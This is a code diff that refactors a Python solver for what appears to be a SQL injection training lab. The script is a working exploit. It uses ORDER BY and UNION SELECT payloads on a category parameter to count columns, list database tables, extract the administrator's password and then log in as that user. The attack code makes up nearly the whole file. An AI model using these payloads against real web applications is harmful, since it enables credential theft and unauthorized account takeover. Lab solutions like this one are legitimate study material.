@@ -1,20 +1,16 @@
-from ...utils import *
 from bs4 import BeautifulSoup
-from urllib.parse import urljoin
-
-import requests
+from ...utils import *
 
 
-def solve_lab(url, proxies):
-    url = urljoin(url, "/filter")
-
+def solve_lab(session):
+    path = "/filter"
     print_info("Determining the number of columns...")
 
     num_columns = 0
     i = 1
     while True:
         params = {"category": f"' ORDER BY {i} -- //"}
-        resp = requests.get(url, params=params, proxies=proxies, verify=False)
+        resp = session.get_path(path, params=params)
         print_info_secondary(f"{params} => {resp.status_code}")
         if resp.status_code == 500:
             break
@@ -32,7 +28,7 @@ def solve_lab(url, proxies):
         columns = ", ".join(columns)
 
         params = {"category": f"' UNION SELECT {columns} -- //"}
-        resp = requests.get(url, params=params, proxies=proxies, verify=False)
+        resp = session.get_path(path, params=params)
         print_info_secondary(f"{params} => {resp.status_code}")
         if resp.status_code == 200:
             break
@@ -50,11 +46,11 @@ def solve_lab(url, proxies):
     params = {"category": f"' UNION SELECT {columns} FROM information_schema.tables --"}
 
     print_info(
-        f'Finding relevant table by visiting "{url}" with the following parameters:'
+        f'Finding relevant table by visiting "{path}" with the following parameters:'
     )
     print(params)
 
-    resp = requests.get(url, params=params, proxies=proxies, verify=False)
+    resp = session.get_path(path, params=params)
     soup = BeautifulSoup(resp.text, "html.parser")
     query = soup.find(lambda tag: tag.name == "th" and tag.text.startswith("users"))
 
@@ -72,11 +68,11 @@ def solve_lab(url, proxies):
     }
 
     print_info(
-        f'Finding column names by visiting "{url}" with the following parameters:'
+        f'Finding column names by visiting "{path}" with the following parameters:'
     )
     print(params)
 
-    resp = requests.get(url, params=params, proxies=proxies, verify=False)
+    resp = session.get_path(path, params=params)
     soup = BeautifulSoup(resp.text, "html.parser")
     q1 = soup.find(lambda tag: tag.name == "th" and tag.text.startswith("username"))
     q2 = soup.find(lambda tag: tag.name == "th" and tag.text.startswith("password"))
@@ -98,11 +94,11 @@ def solve_lab(url, proxies):
     }
 
     print_info(
-        f'Extracting administrator password by visiting "{url}" with the following parameters:'
+        f'Extracting administrator password by visiting "{path}" with the following parameters:'
     )
     print(params)
 
-    resp = requests.get(url, params=params, proxies=proxies, verify=False)
+    resp = session.get_path(path, params=params)
     soup = BeautifulSoup(resp.text, "html.parser")
     query = soup.find(lambda tag: tag.name == "th")
 
@@ -112,28 +108,4 @@ def solve_lab(url, proxies):
     password = query.text
     print_success(f"Found administrator password: {password}\n")
 
-    url = urljoin(url, "/login")
-    print_info(f'Grabbing CSRF value from "{url}"...')
-
-    s = requests.session()
-    resp = s.get(url, proxies=proxies, verify=False)
-    soup = BeautifulSoup(resp.text, "html.parser")
-    csrf = soup.select_one('input[name="csrf"]').get("value")
-
-    if csrf is None:
-        print_fail("Unable to grab CSRF value.")
-
-    else:
-        print_success(f"CSRF value: {csrf}\n")
-
-    data = {"csrf": csrf, "username": "administrator", "password": password}
-    print_info("Logging in with the following values:")
-    print(data)
-
-    resp = s.post(
-        url,
-        proxies=proxies,
-        verify=False,
-        data=data,
-    )
-    print_success("SQL injection attack performed.\n")
+    session.login("administrator", password)
